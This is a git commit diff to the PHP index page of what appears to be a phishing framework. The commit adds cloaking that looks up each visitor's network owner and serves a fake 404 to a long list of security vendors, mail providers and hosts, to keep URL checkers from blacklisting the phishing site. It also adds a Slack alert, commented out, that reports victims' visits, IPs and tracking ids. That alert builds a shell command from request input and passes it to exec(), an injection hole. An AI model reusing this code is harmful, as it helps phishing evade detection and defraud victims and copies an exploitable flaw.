7a20e85281a1d91767ee694b373e61bcdf053e14
Curtis Brazzell <curtbraz@gmail.com>
2020-05-28 16:32:15 -0400

    Update index.php
    Adding in alerts for tuning blacklist (off by default)

--- index.php
+++ index.php
@@ -1,16 +1,30 @@
 <?php
 
+// Pulls in Required Connection Variables
+require_once 'config.php';
+
+// Enter Your Phishing URL Below
+$url = $APIDomain;
+
+$allowed = "- *Accessed Phishing Site* -";
+
 // This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
 $ip = $_SERVER['REMOTE_ADDR'];
-//$ip = "64.233.172.122"; // GOOGLE Email Inspection IP
+//$ip = "52.59.102.42";
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
 $org = $details->org;
 
-$blockorgs = array("Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange");
+// List of Orgs to be Blacklisted
+$blockorgs = array("Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083");
 
 if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m)) {
-	echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42mfvl.jpg\"></HTML></BODY>";
-	$allowed = "- *Jedi Mind Trick Successful* -";
+
+// Content for Orgs to see on the Blacklist
+//echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
+// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
+header('HTTP/1.0 404 not found'); 
+  
+$allowed = "- *Jedi Mind Trick Successful* -";
 
 } else {
 
@@ -99,9 +113,6 @@ echo $csrfvalue;
 
 // Makes Password Safe for DB
 $user = stripslashes($user);
-
-// Pulls in Required Connection Variables for DB
-require_once 'config.php';
 
 // Create connection
 $conn = mysqli_connect($servername, $username, $password, $dbname);
@@ -461,6 +472,29 @@ exec($cmd);
 
 }
 
+
+
+$allowed = "- *Accessed Phishing Site* -";
 }
+
+if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}
+
+// Slack Message
+if(isset($_REQUEST['id'])){
+$id = $_REQUEST['id'];
+
+// Send Slack Notification
+$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
+} else {
+$id = "";
+$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
+}
+
+// Set Slack Information Here
+$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' '.$SlackIncomingWebhookURL.'';
+
+// UNCOMMENT THIS IF YOU WANT ALERTS WHEN PEOPLE VISIT THE API
+//exec($cmd);
+
 
 ?>
